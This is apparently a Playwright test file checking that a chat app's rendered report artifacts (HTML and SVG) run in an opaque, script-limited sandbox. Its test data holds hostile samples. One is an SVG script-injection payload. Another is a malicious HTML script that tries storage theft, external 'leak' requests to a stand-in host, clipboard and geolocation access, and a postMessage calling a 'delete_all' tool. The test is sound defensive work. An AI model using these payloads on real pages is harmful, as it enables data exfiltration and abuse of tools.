# Copyright 2025-2026 Hanlian Lu. SPDX-License-Identifier: Apache-2.0
"""Chromium coverage for Artifact Canvas and the opaque active HTML boundary."""

from urllib.parse import urlparse

import pytest
from playwright.sync_api import Page, Route

pytestmark = pytest.mark.e2e

_TIMESTAMP = "2026-08-20T12:00:00Z"
_CONVERSATION_ID = "artifact-history"
_RUN_ID = "artifact-run"
_RESOURCE_ID = "artifact-report"
_CONVERSATION = {
    "conversation_id": _CONVERSATION_ID,
    "title": "Artifact",
    "created_at": _TIMESTAMP,
    "updated_at": _TIMESTAMP,
}


def _artifact(*, presentation: str, media_type: str, filename: str) -> dict[str, object]:
    base = f"/web/api/answer/{_RUN_ID}/artifacts/{_RESOURCE_ID}"
    return {
        "resource_id": _RESOURCE_ID,
        "role": "primary_report",
        "media_type": media_type,
        "label": "Quarterly report",
        "filename": filename,
        "byte_size": 512,
        "digest": "a" * 64,
        "presentation": presentation,
        "status": "available",
        "uri": f"dlightrag://answer/{_RUN_ID}/artifacts/{_RESOURCE_ID}",
        "width": None,
        "height": None,
        "data_url": base,
        "download_url": f"{base}?download=1",
        "presentation_url": f"{base}/presentation",
        "issue": None,
    }


def _presentation(artifact: dict[str, object]) -> dict[str, object]:
    return {
        "answer_text": f"Delivery note. [Quarterly report](artifact:{_RESOURCE_ID})",
        "parts": [
            {
                "type": "markdown",
                "text": "Delivery note. ",
                "html": "<p>Delivery note.</p>",
                "artifact": None,
                "evidence_image": None,
                "inline": False,
            },
            {
                "type": "artifact",
                "text": "",
                "html": "",
                "artifact": artifact,
                "evidence_image": None,
                "inline": False,
            },
        ],
        "sources": [],
        "evidence_images": [],
        "artifacts": [artifact],
        "artifact_outcome": {"status": "complete", "issues": []},
    }


def _turn(presentation: dict[str, object]) -> dict[str, object]:
    return {
        "turn_id": "artifact-turn",
        "turn_number": 1,
        "answer_run_id": _RUN_ID,
        "submission_id": "artifact-submission",
        "status": "succeeded",
        "cancel_requested": False,
        "user_text": "Write the report",
        "assistant_text": str(presentation["answer_text"]),
        "user_attachments": [],
        "presentation": presentation,
        "usage": {},
        "evidence": {},
        "error_kind": None,
        "error_message": None,
        "created_at": _TIMESTAMP,
    }


def _install_history(page: Page, presentation: dict[str, object]) -> None:
    def handle(route: Route) -> None:
        path = urlparse(route.request.url).path
        if path == "/web/api/conversations":
            route.fulfill(json=[_CONVERSATION])
            return
        if path == f"/web/api/conversations/{_CONVERSATION_ID}/history":
            route.fulfill(json={"conversation": _CONVERSATION, "turns": [_turn(presentation)]})
            return
        route.continue_()

    page.route("**/web/api/conversations**", handle)


def _open_ready_page(page: Page) -> None:
    with page.expect_response(
        lambda response: response.url.endswith("/history") and response.ok,
        timeout=10000,
    ):
        page.goto(f"/web/conversations/{_CONVERSATION_ID}")
    page.wait_for_selector(".composer-input", timeout=10000)


def test_markdown_primary_report_uses_the_general_artifact_canvas(page: Page) -> None:
    artifact = _artifact(presentation="markdown", media_type="text/markdown", filename="report.md")
    _install_history(page, _presentation(artifact))
    requested: list[str] = []

    def presentation_route(route: Route) -> None:
        requested.append(urlparse(route.request.url).path)
        route.fulfill(
            json={
                "answer_text": "# Quarterly review\n\nLong body.",
                "parts": [
                    {
                        "type": "markdown",
                        "text": "# Quarterly review\n\nLong body.",
                        "html": "<h1>Quarterly review</h1><p>Long body.</p>",
                        "artifact": None,
                        "evidence_image": None,
                        "inline": False,
                    }
                ],
                "sources": [],
                "evidence_images": [],
                "artifacts": [artifact],
                "artifact_outcome": {"status": "complete", "issues": []},
            }
        )

    page.route(
        f"**/web/api/answer/{_RUN_ID}/artifacts/{_RESOURCE_ID}/presentation",
        presentation_route,
    )
    _open_ready_page(page)
    page.get_by_role("button", name="View report").click()

    canvas = page.locator("#artifact-canvas")
    page.wait_for_function(
        "document.getElementById('artifact-canvas')?.classList.contains('open')",
        timeout=10000,
    )
    canvas.get_by_text("Quarterly review").wait_for(timeout=10000)
    assert "Quarterly review" in canvas.inner_text()
    assert "Long body." in canvas.inner_text()
    assert requested == [f"/web/api/answer/{_RUN_ID}/artifacts/{_RESOURCE_ID}/presentation"]
    assert page.locator("#report-panel").count() == 0


def test_desktop_conversation_area_dismisses_a_lone_artifact_canvas(page: Page) -> None:
    page.set_viewport_size({"width": 1440, "height": 900})
    artifact = _artifact(presentation="markdown", media_type="text/markdown", filename="report.md")
    _install_history(page, _presentation(artifact))
    page.route(
        f"**/web/api/answer/{_RUN_ID}/artifacts/{_RESOURCE_ID}/presentation",
        lambda route: route.fulfill(
            json={
                "answer_text": "Report body.",
                "parts": [
                    {
                        "type": "markdown",
                        "text": "Report body.",
                        "html": "<p>Report body.</p>",
                        "artifact": None,
                        "evidence_image": None,
                        "inline": False,
                    }
                ],
                "sources": [],
                "evidence_images": [],
                "artifacts": [artifact],
                "artifact_outcome": {"status": "complete", "issues": []},
            }
        ),
    )
    _open_ready_page(page)
    page.get_by_role("button", name="View report").click()
    page.get_by_text("Report body.").wait_for(timeout=10000)
    assert page.locator("#panel").get_attribute("data-panel-kind") is None

    page.locator("#chat-area").click(position={"x": 8, "y": 8})

    page.wait_for_function(
        "!document.getElementById('artifact-canvas')?.classList.contains('open')",
        timeout=10000,
    )


def test_svg_top_level_navigation_is_script_disabled_and_opaque(page: Page) -> None:
    path = f"/web/api/answer/{_RUN_ID}/artifacts/svg-image"
    svg = """<svg xmlns="http://www.w3.org/2000/svg"
      onload="document.documentElement.dataset.executed='event'">
      <script>document.documentElement.dataset.executed='script'</script>
      <text>Safe chart</text>
    </svg>"""
    page.route(
        f"**{path}",
        lambda route: route.fulfill(
            status=200,
            body=svg,
            headers={
                "Content-Type": "image/svg+xml",
                "Content-Disposition": 'inline; filename="chart.svg"',
                "Content-Security-Policy": "sandbox; default-src 'none'; img-src data:",
                "X-Content-Type-Options": "nosniff",
                "Cache-Control": "private, no-store",
            },
        ),
    )

    response = page.goto(path)

    assert response is not None
    assert response.headers["content-security-policy"] == (
        "sandbox; default-src 'none'; img-src data:"
    )
    assert page.locator("svg").get_attribute("data-executed") is None
    assert page.evaluate("window.origin") == "null"
    assert page.evaluate(
        """() => {
          try { localStorage.setItem('svg', 'active'); return false; }
          catch (_) { return true; }
        }"""
    )


_MALICIOUS_HTML = """<!doctype html><html><body>
<div id="results"></div>
<script>
(async () => {
  const result = {};
  try { parent.document.body.dataset.compromised = 'yes'; result.parent = false; }
  catch (_) { result.parent = true; }
  try { localStorage.setItem('stolen', 'yes'); result.storage = false; }
  catch (_) { result.storage = true; }
  try { indexedDB.open('stolen'); result.indexeddb = false; }
  catch (_) { result.indexeddb = true; }
  try { result.popup = window.open('about:blank') === null; }
  catch (_) { result.popup = true; }
  try {
    result.worker = await new Promise((resolve) => {
      const worker = new Worker('data:text/javascript,postMessage(1)');
      worker.onmessage = () => resolve(false);
      worker.onerror = () => resolve(true);
      setTimeout(() => resolve(true), 250);
    });
  } catch (_) { result.worker = true; }
  try { top.location = 'https://navigation.invalid/leak'; result.top = false; }
  catch (_) { result.top = true; }
  try {
    await fetch('/web/api/bootstrap');
    result.sameOrigin = false;
  } catch (_) { result.sameOrigin = true; }
  try {
    await fetch('https://network.invalid/leak');
    result.external = false;
  } catch (_) { result.external = true; }
  try {
    await navigator.clipboard.writeText('stolen');
    result.clipboard = false;
  } catch (_) { result.clipboard = true; }
  try {
    result.device = await new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(
        () => resolve(false), () => resolve(true), {timeout: 250}
      );
      setTimeout(() => resolve(true), 300);
    });
  } catch (_) { result.device = true; }
  try {
    await document.documentElement.requestFullscreen();
    result.fullscreen = false;
  } catch (_) { result.fullscreen = true; }
  const nested = document.createElement('iframe');
  nested.src = 'https://network.invalid/nested';
  document.body.append(nested);
  const form = document.createElement('form');
  form.action = 'https://network.invalid/form';
  form.method = 'post';
  document.body.append(form);
  try { form.submit(); } catch (_) {}
  const download = document.createElement('a');
  download.href = 'https://network.invalid/download';
  download.download = 'stolen.txt';
  document.body.append(download);
  download.click();
  try { parent.postMessage({type: 'tool', name: 'delete_all'}, '*'); } catch (_) {}
  document.getElementById('results').textContent = JSON.stringify(result);
  document.body.dataset.done = 'true';
})();
</script>
<img src="https://network.invalid/pixel">
</body></html>"""


def test_active_html_is_opt_in_opaque_and_destroyed_on_close(page: Page) -> None:
    artifact = _artifact(presentation="html", media_type="text/html", filename="report.html")
    _install_history(page, _presentation(artifact))
    network_hits: list[str] = []
    downloads: list[str] = []
    page.on("download", lambda download: downloads.append(download.suggested_filename))

    def artifact_data(route: Route) -> None:
        route.fulfill(
            status=200,
            body=_MALICIOUS_HTML,
            headers={
                "Content-Type": "application/octet-stream",
                "Content-Disposition": 'attachment; filename="report.html"',
                "X-Content-Type-Options": "nosniff",
                "Cache-Control": "private, no-store",
            },
        )

    def network_probe(route: Route) -> None:
        network_hits.append(route.request.url)
        route.fulfill(status=204)

    page.route(f"**/web/api/answer/{_RUN_ID}/artifacts/{_RESOURCE_ID}", artifact_data)
    page.route("**://network.invalid/**", network_probe)
    _open_ready_page(page)
    page.get_by_role("button", name="View report").click()

    canvas = page.locator("#artifact-canvas")
    canvas.get_by_role("button", name="Open interactive report").wait_for(timeout=10000)
    assert canvas.locator("dl-active-artifact-frame iframe").count() == 0
    canvas.get_by_role("button", name="Open interactive report").click()
    iframe = canvas.locator("dl-active-artifact-frame").locator("iframe")
    iframe.wait_for(timeout=10000)
    assert iframe.get_attribute("sandbox") == "allow-scripts"
    assert "allow-same-origin" not in (iframe.get_attribute("sandbox") or "")

    child = page.frame_locator("dl-active-artifact-frame iframe")
    child.locator("body[data-done='true']").wait_for(timeout=10000)
    result = child.locator("#results").inner_text()
    for protection in (
        "parent",
        "storage",
        "indexeddb",
        "popup",
        "worker",
        "top",
        "sameOrigin",
        "external",
        "clipboard",
        "device",
        "fullscreen",
    ):
        assert f'"{protection}":true' in result
    assert page.locator("body").get_attribute("data-compromised") is None
    # Chromium may issue the anchor navigation request before the sandbox denies
    # the download. It must not create a browser download; all Fetch/subresource,
    # form, and nested-frame requests remain blocked.
    assert downloads == []
    assert network_hits == ["https://network.invalid/download"]

    child.locator("body").click()
    page.keyboard.press("Escape")
    page.wait_for_function(
        "!document.getElementById('artifact-canvas')?.classList.contains('open')",
        timeout=10000,
    )
    assert page.locator("dl-active-artifact-frame iframe").count() == 0
    assert page.get_by_role("button", name="View report").evaluate(
        "element => document.activeElement === element"
    )
